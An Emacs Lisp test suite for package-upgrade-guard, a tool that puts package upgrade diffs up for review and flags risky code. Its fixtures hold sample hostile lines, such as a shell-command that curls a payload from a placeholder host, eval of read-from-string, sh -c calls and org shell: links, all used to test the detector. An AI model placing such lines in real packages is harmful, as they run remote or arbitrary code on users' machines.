;;; package-upgrade-guard-tests.el --- Tests for package-upgrade-guard -*- lexical-binding: t; -*-

;; Copyright (C) 2025 kn66

;;; Commentary:

;; Unit tests for package-upgrade-guard.

;;; Code:

(require 'cl-lib)
(require 'ert)
(require 'package-upgrade-guard)

(defun package-upgrade-guard-test--desc (name version &optional dir)
  "Return a package descriptor named NAME at VERSION.
DIR is used as the descriptor's installed directory when non-nil."
  (package-desc-create
   :name name
   :version version
   :summary "test package"
   :reqs nil
   :kind 'tar
   :archive "test"
   :dir dir))

(ert-deftest package-upgrade-guard-installed-package-rejection-prevents-install ()
  "A rejected modification through `package-install' must not be installed."
  (let ((pkg-desc
         (package-upgrade-guard-test--desc 'pkg '(1 0)))
        (package-upgrade-guard-enabled t)
        (called nil))
    (cl-letf (((symbol-function 'package-installed-p)
               (lambda (_name &optional _min-version) t))
              ((symbol-function
                'package-upgrade-guard--install-transaction)
               (lambda (_pkg) (list pkg-desc)))
              ((symbol-function
                'package-upgrade-guard--review-install-transaction)
               (lambda (_transaction &optional _reviewed) nil)))
      (package-upgrade-guard--advice-package-install
       (lambda (&rest _args)
         (setq called t))
       pkg-desc)
      (should-not called))))

(ert-deftest package-upgrade-guard-new-install-skips-review ()
  "A direct new installation must proceed without a diff review."
  (let ((pkg-desc
         (package-upgrade-guard-test--desc 'pkg '(1 0)))
        (package-upgrade-guard-enabled t)
        called
        reviewed)
    (cl-letf (((symbol-function 'package-installed-p)
               (lambda (_name &optional _min-version) nil))
              ((symbol-function
                'package-upgrade-guard--install-transaction)
               (lambda (_pkg) (list pkg-desc)))
              ((symbol-function
                'package-upgrade-guard--review-install-transaction)
               (lambda (&rest _args) (setq reviewed t) nil)))
      (package-upgrade-guard--advice-package-install
       (lambda (&rest _args) (setq called t)) pkg-desc)
      (should called)
      (should-not reviewed))))

(ert-deftest package-upgrade-guard-artifact-digest-must-match-review ()
  "Installation must reject package bytes that differ from the review."
  (let* ((pkg-desc (package-upgrade-guard-test--desc 'pkg '(1 0)))
         (key (package-desc-full-name pkg-desc))
         (package-upgrade-guard--installing-reviewed-artifacts t)
         called)
    (unwind-protect
        (progn
          (with-temp-buffer
            (insert "reviewed bytes")
            (puthash key (secure-hash 'sha256 (current-buffer))
                     package-upgrade-guard--reviewed-artifact-digests)
            (package-upgrade-guard--advice-package-unpack
             (lambda (_desc) (setq called t)) pkg-desc))
          (should called)
          (setq called nil)
          (puthash key "wrong digest"
                   package-upgrade-guard--reviewed-artifact-digests)
          (with-temp-buffer
            (insert "different bytes")
            (should-error
             (package-upgrade-guard--advice-package-unpack
              (lambda (_desc) (setq called t)) pkg-desc)))
          (should-not called))
      (clrhash package-upgrade-guard--reviewed-artifact-digests))))

(ert-deftest package-upgrade-guard-explicit-new-artifact-may-skip-digest ()
  "An explicitly requested new package may unpack without a review digest."
  (let* ((pkg-desc (package-upgrade-guard-test--desc 'pkg '(1 0)))
         (package-upgrade-guard--installing-reviewed-artifacts t)
         (package-upgrade-guard--allowed-unreviewed-artifacts
          (list (package-desc-full-name pkg-desc)))
         called)
    (with-temp-buffer
      (insert "new package bytes")
      (package-upgrade-guard--advice-package-unpack
       (lambda (_desc) (setq called t)) pkg-desc))
    (should called)))

(ert-deftest package-upgrade-guard-unreviewed-upgrade-dependency-is-rejected ()
  "An unreviewed dependency that was not a direct install must fail closed."
  (let ((pkg-desc (package-upgrade-guard-test--desc 'dep '(1 0)))
        (package-upgrade-guard--installing-reviewed-artifacts t))
    (with-temp-buffer
      (insert "dependency bytes")
      (should-error
       (package-upgrade-guard--advice-package-unpack #'ignore pkg-desc)))))

(ert-deftest package-upgrade-guard-menu-new-installs-skip-review ()
  "New package menu installs are returned without review."
  (let ((new-desc (package-upgrade-guard-test--desc 'new '(1 0)))
        reviewed)
    (cl-letf (((symbol-function 'package-installed-p)
               (lambda (_name &optional _min-version) nil))
              ((symbol-function
                'package-upgrade-guard--install-transaction)
               (lambda (_pkg) (list new-desc)))
              ((symbol-function
                'package-upgrade-guard--review-menu-package-list)
               (lambda (packages _reviewed)
                 (setq reviewed packages)
                 packages)))
      (should (equal (package-upgrade-guard--review-menu-packages
                      (list new-desc) nil)
                     (cons (list new-desc) nil)))
      (should-not reviewed))))

(ert-deftest package-upgrade-guard-new-install-reviews-installed-dependency ()
  "A new install must still review modifications to installed dependencies."
  (let* ((root (package-upgrade-guard-test--desc 'root '(1 0)))
         (dep (package-upgrade-guard-test--desc 'dep '(2 0)))
         (package-upgrade-guard-enabled t)
         reviewed)
    (cl-letf (((symbol-function 'package-installed-p)
               (lambda (name &optional _min-version) (eq name 'dep)))
              ((symbol-function
                'package-upgrade-guard--install-transaction)
               (lambda (_pkg) (list root dep)))
              ((symbol-function
                'package-upgrade-guard--review-install-transaction)
               (lambda (transaction &optional _reviewed)
                 (setq reviewed transaction)
                 nil)))
      (package-upgrade-guard--advice-package-install #'ignore root)
      (should (equal reviewed (list dep))))))

(ert-deftest package-upgrade-guard-review-errors-fail-closed ()
  "A review error must reject installation without an override prompt."
  (let ((pkg-desc (package-upgrade-guard-test--desc 'pkg '(1 0)))
        prompted)
    (cl-letf (((symbol-function 'package-upgrade-guard--show-tarball-diff)
               (lambda (_desc) (error "review failed")))
              ((symbol-function 'y-or-n-p)
               (lambda (&rest _args) (setq prompted t) t)))
      (should-not (package-upgrade-guard--review-install-package pkg-desc))
      (should-not prompted))))

(ert-deftest package-upgrade-guard-upgrade-reviews-install-transaction ()
  "Package upgrades should review the full install transaction."
  (let ((old-desc
         (package-upgrade-guard-test--desc 'pkg '(1 0) "/tmp/pkg-1.0"))
        (new-desc
         (package-upgrade-guard-test--desc 'pkg '(2 0)))
        (dep-desc
         (package-upgrade-guard-test--desc 'dep '(1 0)))
        reviewed-transaction)
    (cl-letf (((symbol-function 'package-upgrade-guard--package-desc)
               (lambda (_pkg-name source)
                 (pcase source
                   ('installed old-desc)
                   ('archive new-desc))))
              ((symbol-function 'package-upgrade-guard--package-vc-p)
               (lambda (_pkg-desc) nil))
              ((symbol-function 'package-upgrade-guard--install-transaction)
               (lambda (_pkg-desc) (list new-desc dep-desc)))
              ((symbol-function
                'package-upgrade-guard--review-install-transaction)
               (lambda (transaction &optional _reviewed)
                 (setq reviewed-transaction transaction)
                 t)))
      (should (package-upgrade-guard--review-package-upgrade 'pkg))
      (should (equal reviewed-transaction (list new-desc dep-desc))))))

(ert-deftest package-upgrade-guard-temp-cleanup-preserves-base-directory ()
  "Cleaning up temporary files must not delete the configured base directory."
  (let* ((base-dir (make-temp-file "package-upgrade-guard-test-" t))
         (sentinel (expand-file-name "keep" base-dir))
         (package-upgrade-guard-temp-dir base-dir)
         (package-upgrade-guard--temp-dir nil)
         session-dir)
    (unwind-protect
        (progn
          (write-region "keep" nil sentinel nil 'silent)
          (setq session-dir (package-upgrade-guard--get-temp-dir))
          (should (file-directory-p session-dir))
          (should (string-prefix-p
                   (file-name-as-directory (expand-file-name base-dir))
                   (expand-file-name session-dir)))
          (package-upgrade-guard--cleanup-temp-dir)
          (should (file-directory-p base-dir))
          (should (file-exists-p sentinel))
          (should-not (file-exists-p session-dir)))
      (when (file-exists-p base-dir)
        (delete-directory base-dir t)))))

(ert-deftest package-upgrade-guard-menu-rejected-upgrade-does-not-execute ()
  "Rejected package-menu upgrades must not fall through to deletion."
  (let ((old-desc
         (package-upgrade-guard-test--desc 'pkg '(1 0) "/tmp/pkg-1.0"))
        (new-desc
         (package-upgrade-guard-test--desc 'pkg '(2 0)))
        (package-upgrade-guard-enabled t)
        (called nil)
        (unmark-args nil))
    (cl-letf (((symbol-function
                'package-upgrade-guard--collect-menu-marked-packages)
               (lambda () (cons (list new-desc) (list old-desc))))
              ((symbol-function
                'package-upgrade-guard--partition-menu-transaction)
               (lambda (_install-list _delete-list)
                 `((delete . nil)
                   (install . nil)
                   (upgrade . (,new-desc)))))
              ((symbol-function
                'package-upgrade-guard--review-menu-packages)
               (lambda (_install-list _upgrade-list)
                 (cons nil nil)))
              ((symbol-function
                'package-upgrade-guard--unmark-unapproved-packages)
               (lambda (&rest args)
                 (setq unmark-args args))))
      (package-upgrade-guard--advice-package-menu-execute
       (lambda (&optional _noquery)
         (setq called t)))
      (should-not called)
      (should (equal unmark-args
                     (list nil nil (list new-desc) nil))))))

(ert-deftest package-upgrade-guard-menu-pure-delete-still-executes ()
  "Pure package-menu deletes are not review targets and should still run."
  (let ((old-desc
         (package-upgrade-guard-test--desc 'pkg '(1 0) "/tmp/pkg-1.0"))
        (package-upgrade-guard-enabled t)
        (called nil))
    (cl-letf (((symbol-function
                'package-upgrade-guard--collect-menu-marked-packages)
               (lambda () (cons nil (list old-desc)))))
      (package-upgrade-guard--advice-package-menu-execute
       (lambda (&optional _noquery)
         (setq called t)))
      (should called))))

(ert-deftest package-upgrade-guard-detects-both-sides-of-rejected-upgrade ()
  "Rejected upgrades should mark both install and delete menu entries."
  (let ((old-desc
         (package-upgrade-guard-test--desc 'pkg '(1 0) "/tmp/pkg-1.0"))
        (new-desc
         (package-upgrade-guard-test--desc 'pkg '(2 0)))
        (other-desc
         (package-upgrade-guard-test--desc 'other '(1 0))))
    (should
     (package-upgrade-guard--unapproved-menu-entry-p
      ?I new-desc nil (list new-desc) '(pkg)))
    (should
     (package-upgrade-guard--unapproved-menu-entry-p
      ?D old-desc nil (list new-desc) '(pkg)))
    (should-not
     (package-upgrade-guard--unapproved-menu-entry-p
      ?I other-desc nil (list new-desc) '(pkg)))
    (should-not
     (package-upgrade-guard--unapproved-menu-entry-p
      ?D other-desc nil (list new-desc) '(pkg)))))

(ert-deftest package-upgrade-guard-security-diff-filters-unified-hunks ()
  "Security diff mode should keep only hunks with matching lines."
  (let* ((package-upgrade-guard-diff-mode 'security)
         (diff-content
          (concat
           "--- old.md\n"
           "+++ new.md\n"
           "@@ -1,3 +1,3 @@\n"
           " (message \"safe\")\n"
           "-(setq old 1)\n"
           "+(setq new 2)\n"
           "@@ -10,3 +10,3 @@\n"
           " (message \"review\")\n"
           "-(message \"old\")\n"
           "+(shell-command \"curl https://example.invalid/payload\")\n"))
         (filtered
          (package-upgrade-guard--filter-security-unified-diff diff-content)))
    (should (string-match-p "shell-command" filtered))
    (should-not (string-match-p "setq new" filtered))))

(ert-deftest package-upgrade-guard-security-diff-detects-risky-context ()
  "A risky context line must expose a hunk whose argument alone changed."
  (let* ((diff-content
          (concat
           "--- a/README.org\n"
           "+++ b/README.org\n"
           "@@ -1,2 +1,2 @@\n"
           " (shell-command\n"
           "- \"printf safe\")\n"
           "+ \"id > /tmp/package-guard-test\")\n"))
         (filtered
          (package-upgrade-guard--filter-security-unified-diff diff-content)))
    (should (string-match-p "shell-command" filtered))
    (should (string-match-p "package-guard-test" filtered))))

(ert-deftest package-upgrade-guard-security-diff-keeps-matching-file-header ()
  "Security diff mode should keep the header for each matching git file diff."
  (let* ((diff-content
          (concat
           "diff --git a/README.md b/README.md\n"
           "index 1111111..2222222 100644\n"
           "--- a/README.md\n"
           "+++ b/README.md\n"
           "@@ -1 +1 @@\n"
           "-(message \"old\")\n"
           "+(message \"new\")\n"
           "diff --git a/risky.el b/risky.el\n"
           "index 3333333..4444444 100644\n"
           "--- a/risky.el\n"
           "+++ b/risky.el\n"
           "@@ -1 +1 @@\n"
           "-(message \"old\")\n"
           "+(eval (read-from-string payload))\n"))
         (filtered
          (package-upgrade-guard--filter-security-unified-diff diff-content)))
    (should (string-match-p "diff --git a/risky.el b/risky.el" filtered))
    (should (string-match-p "index 3333333" filtered))
    (should-not (string-match-p "README.md" filtered))))

(ert-deftest package-upgrade-guard-security-diff-shows-complete-code-diff ()
  "Code diffs must be shown even when no risk regexp matches."
  (let* ((diff-content
          (concat
           "diff --git a/pkg.el b/pkg.el\n"
           "--- a/pkg.el\n"
           "+++ b/pkg.el\n"
           "@@ -1 +1 @@\n"
           "-(message \"old\")\n"
           "+(message \"new\")\n"))
         (filtered
          (package-upgrade-guard--filter-security-unified-diff diff-content)))
    (should (string-match-p "message \\\"new\\\"" filtered))))

(ert-deftest package-upgrade-guard-security-diff-detects-new-file-lines ()
  "Security diff mode should show matching lines from new files."
  (let ((package-upgrade-guard-diff-mode 'security))
    (should
     (string-match-p
      "call-process"
      (package-upgrade-guard--security-content-lines
       "(message \"safe\")\n(call-process \"sh\" nil nil nil \"-c\" \"id\")"
       "+")))))

(ert-deftest package-upgrade-guard-security-diff-counts-matching-files ()
  "Security diff generation should report files requiring review."
  (let ((old-dir (make-temp-file "package-guard-old-" t))
        (new-dir (make-temp-file "package-guard-new-" t))
        (package-upgrade-guard-diff-mode 'security))
    (unwind-protect
        (progn
          (write-region "(message \"old\")\n" nil
                        (expand-file-name "README.md" old-dir) nil 'silent)
          (write-region "(message \"new\")\n" nil
                        (expand-file-name "README.md" new-dir) nil 'silent)
          (write-region "(message \"old\")\n" nil
                        (expand-file-name "risky.el" old-dir) nil 'silent)
          (write-region "(shell-command \"id\")\n" nil
                        (expand-file-name "risky.el" new-dir) nil 'silent)
          (with-temp-buffer
            (let ((review (package-upgrade-guard--generate-diff
                           old-dir new-dir)))
              (should (= 1 (plist-get review :matches)))
              (should (= 2 (plist-get review :changes))))))
      (delete-directory old-dir t)
      (delete-directory new-dir t))))

(ert-deftest package-upgrade-guard-no-change-review-proceeds-without-prompt ()
  "A complete review with no differences should not prompt."
  (let ((pkg-desc (package-upgrade-guard-test--desc 'pkg '(2 0)))
        (package-upgrade-guard-diff-mode 'security)
        prompted
        displayed)
    (cl-letf (((symbol-function
                'package-upgrade-guard--find-installed-package-dir)
               (lambda (_name) "/tmp/pkg-1.0"))
              ((symbol-function
                'package-upgrade-guard--download-package-safely)
               (lambda (_desc) "/tmp/pkg-2.0"))
              ((symbol-function 'package-upgrade-guard--get-version-from-dir)
               (lambda (_dir) "1.0"))
               ((symbol-function 'package-upgrade-guard--generate-diff)
                (lambda (_old _new)
                  '(:matches 0 :changes 0 :complete t)))
              ((symbol-function 'display-buffer)
               (lambda (&rest _args) (setq displayed t)))
              ((symbol-function 'package-upgrade-guard--ask-user-approval)
               (lambda (&rest _args) (setq prompted t))))
      (should (package-upgrade-guard--show-tarball-diff pkg-desc))
      (should-not prompted)
      (should-not displayed))))

(ert-deftest package-upgrade-guard-incomplete-review-fails-closed ()
  "An incomplete review must cancel without an approval prompt."
  (let ((pkg-desc (package-upgrade-guard-test--desc 'pkg '(2 0)))
        (package-upgrade-guard-diff-mode 'security)
        prompted)
    (cl-letf (((symbol-function
                'package-upgrade-guard--find-installed-package-dir)
               (lambda (_name) "/tmp/pkg-1.0"))
              ((symbol-function
                'package-upgrade-guard--download-package-safely)
               (lambda (_desc) "/tmp/pkg-2.0"))
              ((symbol-function 'package-upgrade-guard--get-version-from-dir)
               (lambda (_dir) "1.0"))
               ((symbol-function 'package-upgrade-guard--generate-diff)
                (lambda (_old _new)
                  '(:matches 0 :changes 0 :complete nil)))
              ((symbol-function 'display-buffer) #'ignore)
              ((symbol-function 'package-upgrade-guard--ask-user-approval)
               (lambda (&rest _args) (setq prompted t))))
      (should-not (package-upgrade-guard--show-tarball-diff pkg-desc))
      (should-not prompted))))

(ert-deftest package-upgrade-guard-changed-review-always-prompts ()
  "A real change must prompt even when no sensitive pattern matches."
  (let ((pkg-desc (package-upgrade-guard-test--desc 'pkg '(2 0)))
        (package-upgrade-guard-diff-mode 'security)
        prompted
        displayed)
    (cl-letf (((symbol-function
                'package-upgrade-guard--find-installed-package-dir)
               (lambda (_name) "/tmp/pkg-1.0"))
              ((symbol-function
                'package-upgrade-guard--download-package-safely)
               (lambda (_desc) "/tmp/pkg-2.0"))
              ((symbol-function 'package-upgrade-guard--get-version-from-dir)
               (lambda (_dir) "1.0"))
              ((symbol-function 'package-upgrade-guard--generate-diff)
               (lambda (_old _new)
                 '(:matches 0 :changes 1 :complete t)))
              ((symbol-function 'display-buffer)
               (lambda (&rest _args) (setq displayed t)))
              ((symbol-function 'package-upgrade-guard--ask-user-approval)
               (lambda (&rest _args) (setq prompted t))))
      (should (package-upgrade-guard--show-tarball-diff pkg-desc))
      (should prompted)
      (should displayed))))

(ert-deftest package-upgrade-guard-new-package-shows-all-text-files ()
  "A new package review must show nested files beyond the old preview limit."
  (let* ((new-dir (make-temp-file "package-guard-new-package-" t))
         (nested-dir (expand-file-name "nested" new-dir))
         (pkg-desc (package-upgrade-guard-test--desc 'pkg '(1 0)))
         captured)
    (unwind-protect
        (progn
          (make-directory nested-dir)
          (write-region "(message \"root\")\n" nil
                        (expand-file-name "pkg.el" new-dir) nil 'silent)
          (write-region
           (concat (make-string 600 ?x) "\nEND-OF-NESTED-FILE\n") nil
           (expand-file-name "payload.el" nested-dir) nil 'silent)
          (cl-letf (((symbol-function
                      'package-upgrade-guard--find-installed-package-dir)
                     (lambda (_name) nil))
                    ((symbol-function
                      'package-upgrade-guard--download-package-safely)
                     (lambda (_desc) new-dir))
                    ((symbol-function 'display-buffer) #'ignore)
                    ((symbol-function
                      'package-upgrade-guard--ask-user-approval)
                     (lambda (&rest _args)
                       (setq captured
                             (with-current-buffer "*Package Security Diff*"
                               (buffer-string)))
                       t)))
            (should (package-upgrade-guard--show-tarball-diff pkg-desc))
            (should (string-match-p "nested/payload.el" captured))
            (should (string-match-p "END-OF-NESTED-FILE" captured))))
      (delete-directory new-dir t))))

(ert-deftest package-upgrade-guard-vc-no-change-review-proceeds-without-prompt ()
  "A complete VC review with no differences should not prompt."
  (let* ((pkg-dir (make-temp-file "package-guard-vc-" t))
         (pkg-desc (package-upgrade-guard-test--desc 'pkg '(2 0) pkg-dir))
         prompted
         displayed)
    (unwind-protect
        (progn
          (make-directory (expand-file-name ".git" pkg-dir))
          (cl-letf (((symbol-function
                      'package-upgrade-guard--insert-git-command)
                     (lambda (&rest _args) t))
                    ((symbol-function 'package-upgrade-guard--git-upstream)
                     (lambda (_dir) "origin/main"))
                     ((symbol-function 'package-upgrade-guard--git-output)
                      (lambda (_dir &rest args)
                        (cond
                         ((equal (car args) "status") "")
                         ((equal (car args) "rev-parse") "deadbeef")
                         (t ""))))
                    ((symbol-function 'display-buffer)
                     (lambda (&rest _args) (setq displayed t)))
                    ((symbol-function
                      'package-upgrade-guard--ask-user-approval)
                     (lambda (&rest _args) (setq prompted t))))
            (dolist (mode '(all security))
              (let ((package-upgrade-guard-diff-mode mode))
                (should (package-upgrade-guard--show-vc-diff pkg-desc))))
            (should-not prompted)
            (should-not displayed)))
      (delete-directory pkg-dir t))))

(ert-deftest package-upgrade-guard-vc-no-change-after-manual-review ()
  "A no-change VC review after a changed review must not prompt again."
  (let* ((pkg-dir (make-temp-file "package-guard-vc-sequence-" t))
         (pkg-desc (package-upgrade-guard-test--desc 'pkg '(2 0) pkg-dir))
         (package-upgrade-guard-diff-mode 'security)
         (diff-content
          "@@ -1 +1 @@\n-(message \"old\")\n+(shell-command \"id\")")
         (prompt-count 0))
    (unwind-protect
        (progn
          (make-directory (expand-file-name ".git" pkg-dir))
          (cl-letf (((symbol-function
                      'package-upgrade-guard--insert-git-command)
                     (lambda (&rest _args) t))
                    ((symbol-function 'package-upgrade-guard--git-upstream)
                     (lambda (_dir) "origin/main"))
                     ((symbol-function 'package-upgrade-guard--git-output)
                      (lambda (_dir &rest args)
                        (cond
                         ((equal (car args) "status") "")
                         ((equal (car args) "rev-parse") "deadbeef")
                         ((member "--name-status" args)
                         (if (string-empty-p diff-content) "" "M\tpkg.el"))
                        ((member "--numstat" args)
                         (if (string-empty-p diff-content) "" "1\t1\tpkg.el"))
                        (t diff-content))))
                    ((symbol-function 'display-buffer) #'ignore)
                    ((symbol-function
                      'package-upgrade-guard--ask-user-approval)
                     (lambda (&rest _args)
                       (setq prompt-count (1+ prompt-count))
                       (package-upgrade-guard--cleanup-diff-buffers)
                       t)))
            (should (package-upgrade-guard--show-vc-diff pkg-desc))
            (setq diff-content "")
            (should (package-upgrade-guard--show-vc-diff pkg-desc))
            (should (= 1 prompt-count))))
      (delete-directory pkg-dir t))))

(ert-deftest package-upgrade-guard-vc-dirty-tree-fails-closed ()
  "A dirty VC working tree must cancel review without prompting."
  (let* ((pkg-dir (make-temp-file "package-guard-vc-dirty-" t))
         (pkg-desc (package-upgrade-guard-test--desc 'pkg '(2 0) pkg-dir))
         prompted)
    (unwind-protect
        (progn
          (make-directory (expand-file-name ".git" pkg-dir))
          (cl-letf (((symbol-function
                      'package-upgrade-guard--insert-git-command)
                     (lambda (&rest _args) t))
                    ((symbol-function 'package-upgrade-guard--git-upstream)
                     (lambda (_dir) "origin/main"))
                    ((symbol-function 'package-upgrade-guard--git-output)
                     (lambda (_dir &rest args)
                       (cond
                        ((equal (car args) "status") " M pkg.el")
                        ((equal (car args) "rev-parse") "deadbeef")
                        (t ""))))
                    ((symbol-function 'display-buffer) #'ignore)
                    ((symbol-function
                      'package-upgrade-guard--ask-user-approval)
                     (lambda (&rest _args) (setq prompted t))))
            (should-not (package-upgrade-guard--show-vc-diff pkg-desc))
            (should-not prompted)))
      (delete-directory pkg-dir t))))

(ert-deftest package-upgrade-guard-vc-commit-must-match-review ()
  "A VC upstream move after review must cancel the upgrade."
  (let* ((pkg-dir (make-temp-file "package-guard-vc-pin-" t))
         (pkg-desc (package-upgrade-guard-test--desc 'pkg '(2 0) pkg-dir))
         (key (package-desc-full-name pkg-desc)))
    (unwind-protect
        (progn
          (puthash key "reviewed" package-upgrade-guard--reviewed-vc-commits)
          (cl-letf (((symbol-function 'package-upgrade-guard--git-upstream)
                     (lambda (_dir) "origin/main"))
                    ((symbol-function 'package-upgrade-guard--git-output)
                     (lambda (_dir &rest args)
                       (if (equal (car args) "status") "" "moved"))))
            (should-error
             (package-upgrade-guard--verify-reviewed-vc-commit pkg-desc))))
      (remhash key package-upgrade-guard--reviewed-vc-commits)
      (delete-directory pkg-dir t))))

(ert-deftest package-upgrade-guard-vc-installs-reviewed-commit-without-refetch ()
  "VC installation must merge and activate the exact reviewed commit."
  (let* ((pkg-dir (make-temp-file "package-guard-vc-install-pin-" t))
         (pkg-desc (package-upgrade-guard-test--desc 'pkg '(2 0) pkg-dir))
         (key (package-desc-full-name pkg-desc))
         original-called
         unpacked)
    (unwind-protect
        (progn
          (puthash key "reviewed" package-upgrade-guard--reviewed-vc-commits)
          (cl-letf (((symbol-function 'package-upgrade-guard--git-upstream)
                     (lambda (_dir) "origin/main"))
                    ((symbol-function 'package-upgrade-guard--git-output)
                     (lambda (_dir &rest args)
                       (if (equal (car args) "status") "" "reviewed")))
                    ((symbol-function 'call-process)
                     (lambda (&rest _args) 0))
                    ((symbol-function 'package-vc--unpack-1)
                     (lambda (_desc _dir) (setq unpacked t))))
            (package-upgrade-guard--call-with-reviewed-vc-commit
             (lambda (&rest _args) (setq original-called t))
             pkg-desc pkg-desc)
            (should unpacked)
            (should-not original-called)))
      (remhash key package-upgrade-guard--reviewed-vc-commits)
      (delete-directory pkg-dir t))))

(ert-deftest package-upgrade-guard-vc-oversized-diff-fails-closed ()
  "A VC diff beyond the display limit must not reach approval."
  (let* ((pkg-dir (make-temp-file "package-guard-vc-large-" t))
         (pkg-desc (package-upgrade-guard-test--desc 'pkg '(2 0) pkg-dir))
         (package-upgrade-guard-diff-mode 'all)
         (large-diff
          (make-string (1+ package-upgrade-guard--max-unified-diff-size) ?x))
         prompted)
    (unwind-protect
        (progn
          (make-directory (expand-file-name ".git" pkg-dir))
          (cl-letf (((symbol-function
                      'package-upgrade-guard--insert-git-command)
                     (lambda (&rest _args) t))
                    ((symbol-function 'package-upgrade-guard--git-upstream)
                     (lambda (_dir) "origin/main"))
                    ((symbol-function 'package-upgrade-guard--git-output)
                     (lambda (_dir &rest args)
                       (cond
                        ((equal (car args) "status") "")
                        ((equal (car args) "rev-parse") "deadbeef")
                        (t large-diff))))
                    ((symbol-function 'display-buffer) #'ignore)
                    ((symbol-function
                      'package-upgrade-guard--ask-user-approval)
                     (lambda (&rest _args) (setq prompted t))))
            (should-not (package-upgrade-guard--show-vc-diff pkg-desc))
            (should-not prompted)))
      (delete-directory pkg-dir t))))

(ert-deftest package-upgrade-guard-vc-inspects-complete-document-content ()
  "VC review must inspect active constructs outside the diff context."
  (cl-letf (((symbol-function 'package-upgrade-guard--git-output)
             (lambda (_directory &rest args)
               (when (equal (car args) "show")
                 "Text\nLocal Variables:\neval: (call-interactively command)"))))
    (let ((review
           (package-upgrade-guard--git-active-document-review
            "/tmp" "origin/main" "M\tREADME.org")))
      (should (plist-get review :complete))
      (should
       (member "active content in documentation: README.org"
               (plist-get review :reasons))))))

(ert-deftest package-upgrade-guard-documentation-change-requires-review ()
  "Documentation-only text changes are still real differences."
  (let ((old-dir (make-temp-file "package-guard-doc-old-" t))
        (new-dir (make-temp-file "package-guard-doc-new-" t))
        (package-upgrade-guard-diff-mode 'security))
    (unwind-protect
        (progn
          (write-region "Old documentation\n" nil
                        (expand-file-name "README.md" old-dir) nil 'silent)
          (write-region "New documentation\n" nil
                        (expand-file-name "README.md" new-dir) nil 'silent)
          (with-temp-buffer
            (let ((review (package-upgrade-guard--generate-diff
                           old-dir new-dir)))
              (should (= 1 (plist-get review :changes)))
              (should-not (package-upgrade-guard--review-no-changes-p review)))))
      (delete-directory old-dir t)
      (delete-directory new-dir t))))

(ert-deftest package-upgrade-guard-identical-trees-report-no-changes ()
  "Identical text and binary files should proceed without prompting."
  (let ((old-dir (make-temp-file "package-guard-same-old-" t))
        (new-dir (make-temp-file "package-guard-same-new-" t)))
    (unwind-protect
        (progn
          (dolist (dir (list old-dir new-dir))
            (write-region "Same documentation\n" nil
                          (expand-file-name "README.md" dir) nil 'silent)
            (write-region (unibyte-string 0 1 2 3) nil
                          (expand-file-name "image.bin" dir) nil 'silent))
          (dolist (mode '(all security))
            (let ((package-upgrade-guard-diff-mode mode))
              (with-temp-buffer
                (let ((review (package-upgrade-guard--generate-diff
                               old-dir new-dir)))
                  (should (zerop (plist-get review :changes)))
                  (should (package-upgrade-guard--review-no-changes-p
                           review)))))))
      (delete-directory old-dir t)
      (delete-directory new-dir t))))

(ert-deftest package-upgrade-guard-security-review-blocks-active-document ()
  "File-local variables in documentation must require manual review."
  (let ((old-dir (make-temp-file "package-guard-active-old-" t))
        (new-dir (make-temp-file "package-guard-active-new-" t))
        (package-upgrade-guard-diff-mode 'security))
    (unwind-protect
        (progn
          (write-region
           "Text\n;; Local Variables:\n;; eval: (message \"safe\")\n;; End:\n"
           nil (expand-file-name "README.org" old-dir) nil 'silent)
          (write-region
           "Text\n;; Local Variables:\n;; eval: (call-interactively command)\n;; End:\n"
           nil (expand-file-name "README.org" new-dir) nil 'silent)
          (with-temp-buffer
            (let ((review (package-upgrade-guard--generate-diff
                           old-dir new-dir)))
              (should-not (package-upgrade-guard--review-no-changes-p review))
              (should
               (member "active content in documentation: README.org"
                       (plist-get review :reasons))))))
      (delete-directory old-dir t)
      (delete-directory new-dir t))))

(ert-deftest package-upgrade-guard-security-review-blocks-code-change ()
  "Executable Lisp changes must require manual approval."
  (let ((old-dir (make-temp-file "package-guard-code-old-" t))
        (new-dir (make-temp-file "package-guard-code-new-" t))
        (package-upgrade-guard-diff-mode 'security))
    (unwind-protect
        (progn
          (write-region "(message \"old\")\n" nil
                        (expand-file-name "pkg.el" old-dir) nil 'silent)
          (write-region "(message \"new\")\n" nil
                        (expand-file-name "pkg.el" new-dir) nil 'silent)
          (with-temp-buffer
            (let ((review (package-upgrade-guard--generate-diff
                           old-dir new-dir)))
              (should (= 1 (plist-get review :changes)))
              (should-not (package-upgrade-guard--review-no-changes-p review)))))
      (delete-directory old-dir t)
      (delete-directory new-dir t))))

(ert-deftest package-upgrade-guard-security-review-shows-unmatched-code-change ()
  "Manual code review must contain the complete unmatched code diff."
  (let ((old-dir (make-temp-file "package-guard-code-old-" t))
        (new-dir (make-temp-file "package-guard-code-new-" t))
        (package-upgrade-guard-diff-mode 'security))
    (unwind-protect
        (progn
          (write-region "(message \"old\")\n" nil
                        (expand-file-name "pkg.el" old-dir) nil 'silent)
          (write-region "(message \"new\")\n" nil
                        (expand-file-name "pkg.el" new-dir) nil 'silent)
          (with-temp-buffer
            (package-upgrade-guard--generate-diff old-dir new-dir)
            (should (string-match-p "message \\\"new\\\"" (buffer-string)))))
      (delete-directory old-dir t)
      (delete-directory new-dir t))))

(ert-deftest package-upgrade-guard-security-review-shows-unmatched-documentation-change ()
  "Security review must not hide documentation changes without pattern matches."
  (let ((old-dir (make-temp-file "package-guard-doc-old-" t))
        (new-dir (make-temp-file "package-guard-doc-new-" t))
        (package-upgrade-guard-diff-mode 'security))
    (unwind-protect
        (progn
          (write-region "Old ordinary documentation\n" nil
                        (expand-file-name "README.md" old-dir) nil 'silent)
          (write-region "New ordinary documentation\n" nil
                        (expand-file-name "README.md" new-dir) nil 'silent)
          (with-temp-buffer
            (let ((review (package-upgrade-guard--generate-diff
                           old-dir new-dir)))
              (should (zerop (plist-get review :matches)))
              (should
               (string-match-p "New ordinary documentation"
                               (buffer-string)))
              (should
               (string-match-p "no changes were hidden"
                               (buffer-string))))))
      (delete-directory old-dir t)
      (delete-directory new-dir t))))

(ert-deftest package-upgrade-guard-security-highlights-active-document-links ()
  "Active document constructs must be highlighted even without API matches."
  (let ((package-upgrade-guard-diff-mode 'security))
    (with-temp-buffer
      (insert "+[[shell:touch /tmp/package-guard-test][Open]]\n"
              "+#+PROPERTY: header-args :eval yes\n")
      (diff-mode)
      (package-upgrade-guard--highlight-security-patterns)
      (font-lock-ensure)
      (goto-char (point-min))
      (dolist (text '("shell:" "PROPERTY:"))
        (search-forward text)
        (let ((face (get-text-property (1- (point)) 'face)))
          (should (if (listp face)
                      (memq 'font-lock-warning-face face)
                    (eq face 'font-lock-warning-face))))))))

